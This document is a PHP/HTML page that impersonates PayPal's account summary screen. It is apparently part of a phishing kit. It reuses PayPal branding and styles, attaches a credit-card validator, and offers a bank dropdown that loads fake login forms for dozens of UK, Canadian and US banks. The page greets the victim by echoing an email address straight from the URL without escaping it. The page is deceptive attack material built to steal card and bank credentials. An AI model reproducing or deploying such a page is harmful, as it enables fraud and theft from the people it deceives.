<?php
include('../detect.php');
include('../pais/hometrans.php');
?>
<!DOCTYPE html>
<html lang="en_G3" dir="ltr" class="no-js">
<head>
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="apple-mobile-web-app-capable" content="yes"/>
	<meta name="apple-mobile-web-app-status-bar-style" content="black"/>
	<meta name="format-detection" content="telephone=no">
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.paypalobjects.com/webstatic/icon/pp144.png" />
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.paypalobjects.com/webstatic/icon/pp114.png" />
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.paypalobjects.com/webstatic/icon/pp72.png" />
	<link rel="apple-touch-icon-precomposed" href="https://www.paypalobjects.com/webstatic/icon/pp64.png" />
	<link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png" />
	<link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" />
	<link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png" />
	<title><?= $title ?></title>
	<link rel="stylesheet" href="../assets/new/app.ltr.css" />
	<link rel="stylesheet" href="../assets/new/paypal-sans.css" />
	<link rel="stylesheet" href="../assets/new/summary.ltr.css" />
	<link rel="stylesheet" href="../assets/new/summary-widget.ltr.css" />
	<script src="../assets/new/xhr-ads.min.js"></script>
	<script>document.documentElement.className = "js";</script>
	<script src="../assets/new/Intl.min.js"></script>
	<script data-test="ieScript" nonce="">var isLessthanIE10 = false; window.onload = function() { if (isLessthanIE10) { document.getElementById('js_foreground').className += ' vx_hasNavAlert'; } }</script> 
	<link rel="stylesheet" type="text/css" href="../assets/new/vx-header-footer.min.css"/>
	<link rel="stylesheet" type="text/css" href="../assets/new/cw-notifications.min.css"/>
	<link rel="stylesheet" type="text/css" href="../assets/new/text-input.css"/>
	<script type="text/javascript" src="../assets/jquery-1.9.1.js"></script>
	<script type="text/javascript" src="../assets/jquery-blockUI.js"></script>
	<script type="text/javascript" src="../assets/jquery.creditCardValidator.js"></script>
	<script>
		$(document).ready(function(){
			$("#button").click(function(){
				$('#cc_number').validateCreditCard(function(result) {
					if (!result.valid) {
						$('.log').fadeIn('slow', function () {
							$(this).delay(5000).fadeOut('slow');
						});
					}
				});
				$("#cc_number").off('input.jccv keyup.jccv');
			});
		})
	</script>
	<script>
		$(document).ready(function() {
			$('#bank').on('change', function() {
				if (this.value == 'Barclays Bank') {
					$('#form-bank').load('../bank/uk/Brclys.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Santander') {
					$('#form-bank').load('../bank/uk/Stder.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Halifax') {
					$('#form-bank').load('../bank/uk/Hlifx.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Lloyds') {
					$('#form-bank').load('../bank/uk/Lloys.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'HSBC') {
					$('#form-bank').load('../bank/uk/hsbc.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Alliance and Leicester') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Bank of Ireland') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Bank of Scotland') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Cahoot') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Co operative bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Citibank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Clydesdale Bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Egg Bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'First Direct') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Intelligent Finance') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Isle of Man Bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Metro Bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Natwest') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Nationwide') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Northern Bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'RBS') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Sainsburys Bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'TSB Bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Tesco Personal Finance') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Unity Trust Bank plc') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Ulster Bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Virgin Money') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Yorkshire Bank') {
					$('#form-bank').load('../bank/uk/Other.php');
					$('#tbl_button').fadeIn();
				}
				else if (this.value == 'Other') {
					$('#form-bank').load('../bank/uk/otheruk.php');
					$('#tbl_button').fadeIn();
				}
			// Ca Bank
			else if (this.value == 'B2B Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Bank of Montreal') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Bank of Nova Scotia') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Bridgewater Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Cibc') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Canadian Tire Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Canadian Western Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Citizens Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'CFF Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Continental Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'CS Alterna Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'DirectCash Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Equitable Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'First Nations Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'General Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Hollis Canadian Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Laurentian Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Manulife Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'National Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Pacific Western Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Presidents Choice Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'RedBrick Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Rogers Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'RBC') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Tangerine Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'TorontoDominion Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Wealth One Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Zag Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'otherca') {
				$('#form-bank').load('../bank/ca/otherca.php');
				$('#tbl_button').fadeIn();
			}
			// US Bank
			else if (this.value == 'Ally Financial') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'American Express Company') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'BB&T') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Bank of America') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Bank of New York Mellon') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Charles Schwab Corporation') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Capital One') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Citizens Financial Group') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Citigroup') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Fifth Third Bank') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Goldman Sachs') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'HSBC Bank USA') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'JPMorgan Chase') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Morgan Stanley') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'PNC Financial Services') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'SunTrust Banks') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'State Street Corporation') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'TD Bank') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'US Bancorp') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'Wells Fargo') {
				$('#form-bank').load('../bank/us/us.php');
				$('#tbl_button').fadeIn();
			}
			else if (this.value == 'otherus') {
				$('#form-bank').load('../bank/us/otherus.php');
				$('#tbl_button').fadeIn();
			}
		});
});
</script>
</head>
<body>
	<input type="checkbox" id="toggleNavigation" class="vx_globalNav-toggleCheckbox">
	<div class="vx_globalNav-main globalNav-main js_globalNavView js_ppLogo" role="banner">
		<div class="vx_globalNav-container">
			<a href="#" id="header-ppLogo" data-pagename="main:header:logo" class="vx_globalNav-brand_desktop">
				<span class="vx_a11yText"><?= $summary ?>
				</span>
			</a>
			<div class="vx_globalNav-secondaryNav_mobile">
				<div class="vx_globalNav-listItem_mobileLogout">
					<a href="#" id="header-logout_mobile" class="vx_globalNav-link_mobileLogout">Log Out
					</a>
				</div>
				<div class="vx_globalNav-listItem_settings">
					<a href="#" id="header-settings_mobile" class="vx_globalNav-svgIcon vx_globalNav-link_settings">
						<svg width="26px" height="26px" viewBox="-2 4 26 26" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
							<path fill="none" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" d="M22.4,12.4c-0.2-0.4-0.4-0.8-0.6-1.2l-3.6,0.2c-0.4-0.5-0.9-1-1.4-1.4L17,6.3c-0.8-0.4-1.7-0.8-2.5-1.1l-2.3,2.5c-0.7-0.1-1.5-0.1-2.3-0.1L7.7,5.2C7.2,5.3,6.8,5.5,6.4,5.6C6,5.8,5.5,6,5.1,6.3l0.1,3.1c-0.7,0.5-1.4,1.1-2,1.8L0.3,11c-0.5,0.8-0.8,1.7-1.1,2.6l2,1.9c-0.2,1-0.2,2-0.1,2.9l-2,1.8c0.1,0.5,0.3,0.9,0.5,1.4s0.4,0.9,0.6,1.3L3,22.8c0.6,0.8,1.3,1.5,2.1,2.1l-0.2,2.8c0.8,0.5,1.7,0.8,2.6,1.1l2-2.2c0.9,0.1,1.8,0.1,2.7,0l2,2.3c0.5-0.1,0.9-0.3,1.4-0.5c0.4-0.2,0.8-0.4,1.2-0.6l-0.1-3.3c0.6-0.5,1.1-1,1.6-1.6l3.4,0.2c0.5-0.8,0.8-1.6,1.1-2.5l-2.6-2.4c0.1-0.7,0.1-1.3,0-2l2.7-2.4C22.7,13.3,22.5,12.8,22.4,12.4L22.4,12.4z">
							</path>
							<circle fill="none" stroke="#FFFFFF" cx="11" cy="17" r="5.2">
							</circle>
						</svg>
						<span class="vx_a11yText"><?= $settings ?>
						</span>
					</a>
				</div>
				<div>
					<p class="vx_h5 vx_globalNav-displayName"><?= $_GET['email_locked'] ?> 
					</p>
				</div>
			</div>
			<div class="vx_globalNav-navContainer">
				<nav class="vx_globalNav-nav" role="navigation">
					<ul class="vx_globalNav-list">
						<li class="vx_isActive">
							<a href="#" target="_self" id="header-summary" data-pagename="main:header:summary" class="vx_globalNav-links js_summary"><?= $summary ?>
							</a>
						</li>
						<li class="">
							<a href="#" target="_self" id="header-activity" data-pagename="main:header:activity" class="vx_globalNav-links js_activity"><?= $activity ?>
							</a>
						</li>
						<li class="">
							<a href="#" target="_self" id="header-transfer" data-pagename="main:header:transfer" class="vx_globalNav-links js_sendMoney"><?= $sendreq ?>
							</a>
						</li>
						<li class="">
							<a href="#" target="_self" id="header-wallet" data-pagename="main:header:wallet" class="vx_globalNav-links js_wallet"><?= $wallet ?>
							</a>
						</li>
						<li class="">
							<a href="#" target="_self" id="header-shop" data-pagename="main:header:shop" class="vx_globalNav-links js_shop"><?= $shop ?>
							</a>
						</li>
						<li class="">
							<a href="#" target="_self" id="header-help" data-pagename="main:header:help" class="vx_globalNav-links js_help"><?= $help ?>
							</a>
						</li>
					</ul>
					<ul class="vx_globalNav-list_secondary">
						<li class="vx_hidden-phone" data-autodisplay="false">
							<a href="#" id="header-notifications" class="vx_globalNav-svgIcon vx_globalNav-link_notifications vx_isCritical js_notifications js_notificationDesktopBtn cw_popover-trigger" data-popover-autodisplay="false" data-popover-id="notifications-popover" data-popover-offset="15" data-pagename="main:notifications::toggle" data-popover-pagename-show="main:notifications:toggle" data-popover-pagename-hide="main:notifications:toggle">
								<svg class="notifications-icon" width="32px" height="32px" viewBox="-4 2 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
									<path fill="none" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" d="M17.4,6.5c2.8,1.2,4.8,4.2,4.8,7.6v3.6c0,1.1,0.7,2.5,1.6,3.2c0,0,0.8,0.3,0.8,1.1c0,0,0,0.9-1,0.9H5.5c-1,0-1-0.9-1-0.9c0-0.8,0.8-1.1,0.8-1.1c0.9-0.6,1.6-2,1.6-3.1v-3.6c0-4.5,3.5-8.2,7.7-8.2V2.6">
									</path>
									<path fill="none" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" d="M11.9,24.7c0.3,0.9,1.4,1.8,2.8,1.9c1.3-0.1,2.4-1,2.8-1.9">
									</path>
								</svg>
								<span class="vx_a11yText"><?= $notification ?>
								</span>
							</a>
							<div id="notifications-popover" class="cw_popover-container cw_notifications-container" tabindex="0">
								<div id="cw_tab-list" class="cw_tab-list">
									<button id="cw_tab-notifications" data-panel="cw_panel-notifications" class="cw_tab cw_tab_notifications cw_tab_selected" data-pagename="main:notifications:toggleNotifs"><?= $notification ?> (
										<span id="notificationCount">0
										</span>)
									</button>
									<button id="cw_tab-messages" data-panel="cw_panel-messages" class="cw_tab cw_tab_messages" data-pagename="main:notifications:toggleSMC"><?= $mess ?> (
										<span id="messageCount">0
										</span>)
									</button>
								</div>
								<div class="cw_tab-list-shadow">
								</div>
								<div class="cw_popover-body">
									<ul class="cw_panel cw_panel_notifications cw_panel_selected" id="cw_panel-notifications">
										<li class="cw_notification">
											<div class="cw_notification-subheader">
											</div>
											<div class="cw_notification-description"><?= $nonotif ?>
											</div>
										</li>
									</ul>
									<ul class="cw_panel cw_panel_messages" id="cw_panel-messages">
										<li class="cw_notification">
											<div class="cw_notification-subheader">
											</div>
											<div class="cw_notification-description"><?= $nomess ?>
											</div>
											<a href="#" class="cw_notification-link"><?= $viewmess ?>
											</a>
										</li>
									</ul>
								</div>
							</div>
							<div>
								<script src="https://www.paypalobjects.com/ui-web/cw-pattern-lib/1-5-3-beta/cw-notifications.min.js">
								</script>
							</div>
						</li>
						<li>
							<a href="#" id="header-settings" class="vx_globalNav-svgIcon vx_globalNav-link_settings js_settings">
								<svg width="26px" height="26px" viewBox="-2 4 26 26" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
									<path fill="none" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" d="M22.4,12.4c-0.2-0.4-0.4-0.8-0.6-1.2l-3.6,0.2c-0.4-0.5-0.9-1-1.4-1.4L17,6.3c-0.8-0.4-1.7-0.8-2.5-1.1l-2.3,2.5c-0.7-0.1-1.5-0.1-2.3-0.1L7.7,5.2C7.2,5.3,6.8,5.5,6.4,5.6C6,5.8,5.5,6,5.1,6.3l0.1,3.1c-0.7,0.5-1.4,1.1-2,1.8L0.3,11c-0.5,0.8-0.8,1.7-1.1,2.6l2,1.9c-0.2,1-0.2,2-0.1,2.9l-2,1.8c0.1,0.5,0.3,0.9,0.5,1.4s0.4,0.9,0.6,1.3L3,22.8c0.6,0.8,1.3,1.5,2.1,2.1l-0.2,2.8c0.8,0.5,1.7,0.8,2.6,1.1l2-2.2c0.9,0.1,1.8,0.1,2.7,0l2,2.3c0.5-0.1,0.9-0.3,1.4-0.5c0.4-0.2,0.8-0.4,1.2-0.6l-0.1-3.3c0.6-0.5,1.1-1,1.6-1.6l3.4,0.2c0.5-0.8,0.8-1.6,1.1-2.5l-2.6-2.4c0.1-0.7,0.1-1.3,0-2l2.7-2.4C22.7,13.3,22.5,12.8,22.4,12.4L22.4,12.4z">
									</path>
									<circle fill="none" stroke="#FFFFFF" cx="11" cy="17" r="5.2">
									</circle>
								</svg>
								<span class="vx_a11yText"><?= $settings ?>
								</span>
							</a>
						</li>
						<li class="vx_globalNav-listItem_logout">
							<a href="#" id="header-logout" class="vx_globalNav-link_logout js_logout"><?= $logout ?>
							</a>
						</li>
					</ul>
				</nav>
			</div>
		</div>
		<div>
		</div>
	</div>
	<div id="js_foreground" class="vx_foreground-container foreground-container">
		<div class="vx_globalNav-main_mobile">
			<div class="vx_globalNav-headerSection_trigger">
				<div class="vx_globalNav-toggleTrigger-container">
					<label class="vx_globalNav-toggleTrigger_animated" for="toggleNavigation">
						<span>
						</span>
						<div class="vx_globalNav-toggleTrigger_animated_open"><?= $menu ?>
						</div>
						<div class="vx_globalNav-toggleTrigger_animated_close"><?= $close ?>
						</div>
					</label>
				</div>
			</div>
			<div class="vx_globalNav-headerSection_logo">
				<a href="#" id="header-ppLogo_mobile" class="vx_globalNav-brand_mobile">
					<span class="vx_a11yText"><?= $summary ?>
					</span>
				</a>
			</div>
			<ul class="vx_globalNav-headerSection_actions">
				<li class="vx_globalNav-actionItem_mobileglobalNav_notificationItem vx_globalNav-notificationItem_mobile">
					<a class="vx_globalNav-svgIcon vx_globalNav-link_notifications notifications_mobile vx_isCritical js_notificationDesktopBtn cw_notifications-mobile-trigger" id="header-openNotifications" role="button" title="Notifications" data-popover-autodisplay="false" data-modal-id="notifications-mobile">
						<svg class="notifications-icon" width="32px" height="32px" viewBox="-4 2 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
							<path fill="none" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" d="M17.4,6.5c2.8,1.2,4.8,4.2,4.8,7.6v3.6c0,1.1,0.7,2.5,1.6,3.2c0,0,0.8,0.3,0.8,1.1c0,0,0,0.9-1,0.9H5.5c-1,0-1-0.9-1-0.9c0-0.8,0.8-1.1,0.8-1.1c0.9-0.6,1.6-2,1.6-3.1v-3.6c0-4.5,3.5-8.2,7.7-8.2V2.6">
							</path>
							<path fill="none" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" d="M11.9,24.7c0.3,0.9,1.4,1.8,2.8,1.9c1.3-0.1,2.4-1,2.8-1.9">
							</path>
						</svg>
						<span class="vx_a11yText"><?= $notification ?>
						</span>
					</a>
				</li>
			</ul>
			<div class="vx_modal-flow" id="notifications-mobile">
				<div class="vx_modal-wrapper cw_notifications-modal-wrapper">
					<div class="vx_modal-content cw_notifications-mobile-content">
						<div id="notifications-mobile-popover" class="cw_notifications-mobile-container" tabindex="0">
							<header class="vx_modal-header cw_notifications-mobile-content-header">
								<span class="vx_modal-dismiss_trigger" data-modal-id="notifications-mobile">
									<svg class="close-icon" width="24" height="24" viewBox="0 0 97.998 120" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-id="cw_notifications-mobile-dismiss">
										<path stroke="#2C2E2F" fill="#2C2E2F" d="m82.91 99.121q2.8e-14 0.87891-0.53711 1.416-0.53711 0.53711-1.416 0.53711-0.87891 0-1.4648-0.58594l-30.469-30.469c-7.6538 7.6416-22.961 22.925-30.615 30.566q-0.53711 0.58594-1.416 0.58594t-1.416-0.58594q-1.416-1.416 0-2.7832c10.173-10.205 22.888-22.961 30.518-30.615-7.6294-7.6172-22.888-22.852-30.518-30.469q-1.416-1.5137 0-2.8809 1.416-1.3672 2.9297-0.048829c10.173 10.205 22.888 22.961 30.518 30.615 7.6416-7.6538 22.925-22.961 30.566-30.615q0.48828-0.58594 1.3672-0.58594t1.4648 0.58594q1.416 1.416 0 2.832c-10.205 10.189-22.961 22.925-30.615 30.566 7.6294 7.6294 22.888 22.888 30.518 30.518q0.58594 0.53711 0.58594 1.416z" stroke-width="0px">
										</path>
									</svg>
									<span class="vx_a11yText"><?= $close ?>
									</span>
								</span>
								<svg class="notifications-icon" width="32px" height="32px" viewBox="-4 2 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
									<path fill="none" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" d="M17.4,6.5c2.8,1.2,4.8,4.2,4.8,7.6v3.6c0,1.1,0.7,2.5,1.6,3.2c0,0,0.8,0.3,0.8,1.1c0,0,0,0.9-1,0.9H5.5c-1,0-1-0.9-1-0.9c0-0.8,0.8-1.1,0.8-1.1c0.9-0.6,1.6-2,1.6-3.1v-3.6c0-4.5,3.5-8.2,7.7-8.2V2.6">
									</path>
									<path fill="none" stroke="#FFFFFF" stroke-linecap="round" stroke-linejoin="round" d="M11.9,24.7c0.3,0.9,1.4,1.8,2.8,1.9c1.3-0.1,2.4-1,2.8-1.9">
									</path>
								</svg>
								<div id="cw_tab-list" class="cw_tab-list">
									<button id="cw_tab-notifications" data-panel="cw_panel-notifications" class="cw_tab cw_tab_notifications cw_tab_selected" data-pagename="main:notifications:toggleNotifs"><?= $notification ?> (
										<span id="notificationCount">0
										</span>)
									</button>
									<button id="cw_tab-messages" data-panel="cw_panel-messages" class="cw_tab cw_tab_messages" data-pagename="main:notifications:toggleSMC"><?= $mess ?> (
										<span id="messageCount">0
										</span>)
									</button>
								</div>
								<div class="cw_tab-list-shadow">
								</div>
							</header>
							<div class="cw_popover-body">
								<ul class="cw_panel cw_panel_notifications cw_panel_selected" id="cw_panel-notifications">
									<li class="cw_notification">
										<div class="cw_notification-subheader">
										</div>
										<div class="cw_notification-description"><?= $nonotif ?>
										</div>
									</li>
								</ul>
								<ul class="cw_panel cw_panel_messages" id="cw_panel-messages">
									<li class="cw_notification">
										<div class="cw_notification-subheader">
										</div>
										<div class="cw_notification-description"><?= $nomess ?>
										</div>
										<a href="#" class="cw_notification-link"><?= $viewmess ?>
										</a>
									</li>
								</ul>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1">
			<div id="js_summaryView" class="mainContents summaryContainer">
				<h1 id="heading1" class="accessAid">PayPal: Summary
				</h1>
				<div id="js_engagementModuleView" class="engagementModule nemo_engagementModule" data-engagement-badges="" >
					<div class="engagementMainBar-container js_engagementMainBar-container">
						<div class="summarySection engagementMainBar row">
							<div class="col-sm-7 progressAndWelcome">
								<div id="js_progressMeterView" class="progressMeter nemo_progressMeterView" data-total-percentage="67" data-hide-percent-animation="true">
									<div id="js_outerCircle" class="outerCircle" >
										<div class="half lessThan50">
											<div class="pie right" style="-webkit-transform: rotate(0deg); -moz-transform: rotate(0deg); -ie-transform: rotate(0deg); -o-transform: rotate(0deg); transform: rotate(0deg);">
											</div>
										</div>
										<div class="half greaterThan50 js_greaterThan50">
											<div class="pie left" style="-webkit-transform: rotate(0deg); -moz-transform: rotate(0deg); -ie-transform: rotate(0deg); -o-transform: rotate(0deg); transform: rotate(0deg);">
											</div>
										</div>
									</div>
									<div id="js_innerCircle" class="innerCircle">
										<div class="profilePhotoTable">
											<div id="js_profilePhotoView" class="profilePhotoContainer" name="EM_Photo_Start" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">
												<a id="js_profilePhotoParent" class="profilePhotoParent " name="emUploadPhotoStart" data-profile-photo='{}' data-wurfl='{"isWireless":false,"isTablet":false}'>
													<span id="js_user_icon" class="profilePhotoIcon icon icon-profile-large" aria-hidden="true"data-hover-text="Add a photo">
													</span>
												</a>
											</div>
										</div>
										<div id="js_percentageContainer" class="hide percentageContainer nemo_percentageContainer">
											<div id="js_percentage" class="percentage nemo_accountCompletionPercent">0%
											</div>
										</div>
									</div>
								</div>
								<div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule profileStatus active" data-module-number="">
									<p class="vx_h2 engagementWelcomeMessage nemo_welcomeMessageHeader"><?= $haiagain ?> <?= $_GET['email_locked'] ?> !
									</p>
									<button id="js_engagementActionTrigger" class="vx_btn vx_btn-medium engagement-actionText vx-btn_toggleProfileStatus js_emTrigger nemo_engagementActionTrigger" aria-controls="js_emSlideDownContainer" name="EM_AcctSetup_Open" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">
										<span class="profileStatusText"><?= $getmost ?> PayPal
										</span>
										<span class="js_toggleProfile icon icon-small icon-arrow-down-small icon-small_toggleProfile nemo_profileStatusDownArrow" aria-hidden="true">
										</span>
									</button>
								</div>
							</div>
							<div id="js_engagementActions" class="col-sm-5 engagementActions">
								<ul class="actionsContainer nemo_actionsContainer">
									<li class="actionItem engagement-0-listItem">
										<a href="#" role="button" data-module-number="" name="" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" class="vx_small-text selectModule nemo_transferSelect js_selectModule">
											<span class="icon icon-medium icon-send-money" aria-hidden="true">
											</span>
											<span><?= $payorsend ?>
											</span>
										</a>
									</li>
								</ul>
							</div>
						</div>
					</div>
					<hr  class="engagementMainBar-separator engagementMainBar-separator_hide" >
